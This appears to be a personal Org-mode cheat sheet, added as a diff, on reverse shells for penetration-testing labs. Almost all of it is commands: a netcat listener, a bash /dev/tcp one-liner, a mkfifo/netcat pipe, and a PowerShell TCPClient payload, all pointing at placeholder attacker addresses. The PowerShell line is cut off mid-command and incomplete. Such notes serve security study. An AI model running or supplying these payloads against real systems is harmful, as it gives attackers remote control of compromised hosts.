@@ -1,0 +1,34 @@
+:PROPERTIES:
+:ID:       1008C5EC-5670-4EC8-83F0-CD324729977B
+:END:
+#+title: Reverse Shell
+#+filetags: 
+#+date: [2023-10-11 Wed 20:32]
+
+A revershe shell is the most common type of shell, and is the quickest and easiest method to maintain control over a compromised host.
+
+* Netcat listener
+[[id:883260F6-A296-426E-BE31-4B0833572791][Netcat]] listener on any port
+
+#+begin_src bash
+nc -lvnp 1234
+#+end_src
+* Connect back IP
+First we need to get the systems IP address to send the system back to us. The ip will be the one that the VPN is using to connect.
+
+#+begin_src bash
+ip a
+#+end_src
+
+* Making the connection
+#+begin_src bash
+bash -c 'bash -i >& /dev/tcp/<ip address>/<port number> 0>&1'
+#+end_src>
+
+#+begin_src bash
+rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <ip address> <port number> >/tmp/f
+#+end_src>
+
+#+begin_src powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ip address>",<port number>);$stream = $client.GetStream();[byte[]]
+#+end_src>
